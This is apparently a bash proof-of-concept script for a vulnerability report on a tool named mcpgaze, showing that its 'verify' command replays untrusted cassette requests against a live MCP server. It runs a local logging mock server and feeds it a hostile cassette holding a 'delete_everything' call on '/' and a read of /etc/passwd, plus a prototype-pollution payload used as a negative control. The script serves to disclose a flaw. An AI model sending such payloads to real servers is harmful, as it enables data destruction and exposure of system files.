#!/usr/bin/env bash
# PoC: verify-cassette-arbitrary-live-requests
#
# Claim: `mcpgaze verify` (and `verify --update`) re-issue attacker-controlled
# method/params taken verbatim from an untrusted cassette JSON against whatever
# live MCP server the operator targets. No allow-listing, no read-only filter,
# no confirmation.
#
# This PoC stands up a benign "mock" MCP server that logs every non-initialize
# request it receives (method + params) to $MOCK_LOG, then proves that a hostile
# cassette drives arbitrary destructive-looking JSON-RPC calls (tools/call with
# delete_everything, resources/read of /etc/passwd) into that live server.
#
# Deterministic + re-runnable. All artifacts live in /tmp and are cleaned up.
set -euo pipefail

REPO="/home/gogetassgk/projects/mcpgaze"
WORK="$(mktemp -d /tmp/verify-cassette-poc.XXXXXX)"
RECV_LOG="$WORK/recv.log"
MOCK="$WORK/mock_log.mjs"
CASSETTE="$WORK/v_hostile.json"
PROTO_CASSETTE="$WORK/v_proto.json"
STDOUT_LOG="$WORK/verify.stdout"
PROTO_PROBE="$WORK/proto_probe.mjs"

cleanup() { rm -rf "$WORK"; }
trap cleanup EXIT

# ── 1. Benign mock MCP server. Answers initialize normally. For every other
#       request it appends "RECV <method> <json-params>" to $MOCK_LOG and replies
#       with an empty result. This stands in for a real, write-capable server.
cat > "$MOCK" <<'EOF'
import { appendFileSync } from "node:fs";
const log = process.env.MOCK_LOG;
let buf = "";
process.stdin.on("data", (c) => {
  buf += c.toString("utf8");
  let nl;
  while ((nl = buf.indexOf("\n")) !== -1) {
    const line = buf.slice(0, nl);
    buf = buf.slice(nl + 1);
    if (!line.trim()) continue;
    let msg;
    try { msg = JSON.parse(line); } catch { continue; }
    if (msg.id === undefined || msg.id === null || msg.method === undefined) continue; // notification
    if (msg.method === "initialize") {
      process.stdout.write(JSON.stringify({
        jsonrpc: "2.0", id: msg.id,
        result: { protocolVersion: "2025-06-18", capabilities: {}, serverInfo: { name: "mock", version: "0" } },
      }) + "\n");
      continue;
    }
    appendFileSync(log, `RECV ${msg.method} ${JSON.stringify(msg.params ?? null)}\n`);
    process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: {} }) + "\n");
  }
});
EOF

# ── 2. Hostile cassette: two attacker-chosen interactions.
cat > "$CASSETTE" <<'EOF'
{
  "mcpgazeVersion": "1.0.0",
  "recordedAt": "2026-06-05T00:00:00.000Z",
  "interactions": [
    {
      "request": {
        "method": "tools/call",
        "params": { "name": "delete_everything", "arguments": { "path": "/" } }
      },
      "response": { "result": {} }
    },
    {
      "request": {
        "method": "resources/read",
        "params": { "uri": "file:///etc/passwd" }
      },
      "response": { "result": {} }
    }
  ]
}
EOF

echo "=== Running: mcpgaze verify --cassette <hostile> -- node mock_log.mjs ==="
MOCK_LOG="$RECV_LOG" node --import tsx "$REPO/src/index.ts" \
  verify --cassette "$CASSETTE" -- node "$MOCK" | tee "$STDOUT_LOG"

echo
echo "=== Live server receive log ($RECV_LOG) ==="
cat "$RECV_LOG"

echo
echo "=== Assertions ==="
fail=0
grep -q 'RECV tools/call .*"delete_everything".*"path":"/"' "$RECV_LOG" \
  && echo "PASS: destructive tools/call reached live server verbatim" \
  || { echo "FAIL: tools/call not observed"; fail=1; }
grep -q 'RECV resources/read .*file:///etc/passwd' "$RECV_LOG" \
  && echo "PASS: sensitive resources/read reached live server verbatim" \
  || { echo "FAIL: resources/read not observed"; fail=1; }
grep -q 'RECV initialize' "$RECV_LOG" \
  && { echo "FAIL: initialize was (unexpectedly) re-issued"; fail=1; } \
  || echo "PASS: initialize correctly NOT re-issued (isVerifiable filter)"

# ── 3. update mode: prove live responses get written back into the cassette.
echo
echo "=== Running: mcpgaze verify --update (re-baseline writes live responses back) ==="
: > "$RECV_LOG"
MOCK_LOG="$RECV_LOG" node --import tsx "$REPO/src/index.ts" \
  verify --update --cassette "$CASSETTE" -- node "$MOCK"
grep -q 'RECV tools/call .*delete_everything' "$RECV_LOG" \
  && echo "PASS: --update also re-issued the destructive call to the live server" \
  || { echo "FAIL: --update did not re-issue"; fail=1; }

# ── 4. Negative control: NO prototype pollution inside mcpgaze itself.
cat > "$PROTO_CASSETTE" <<'EOF'
{
  "mcpgazeVersion": "1.0.0",
  "recordedAt": "2026-06-05T00:00:00.000Z",
  "interactions": [
    {
      "request": {
        "method": "__proto__",
        "params": { "__proto__": { "polluted": "yes" }, "constructor": { "prototype": { "polluted2": "yes" } } }
      },
      "response": { "result": {} }
    }
  ]
}
EOF
# Probe runs THROUGH tsx so the extensionless TS imports in src/ resolve.
cat > "$PROTO_PROBE" <<EOF
import { verify } from "${REPO}/src/verify.ts";
const before = ({}).polluted;
await verify("node", ["${MOCK}"], "${PROTO_CASSETTE}");
const after = ({}).polluted;
if (before === undefined && after === undefined) {
  console.log("PASS: no prototype pollution ((\\{\\}).polluted still undefined after verify)");
} else {
  console.log("NOTE: polluted =", after);
}
EOF
echo
echo "=== Negative control: prototype pollution check ==="
MOCK_LOG="$RECV_LOG" node --import tsx "$PROTO_PROBE" || true

echo
if [ "$fail" -eq 0 ]; then
  echo "OVERALL: EXPLOIT REPRODUCED — attacker-controlled method+params reached the live server verbatim."
else
  echo "OVERALL: one or more assertions FAILED."
fi
exit "$fail"
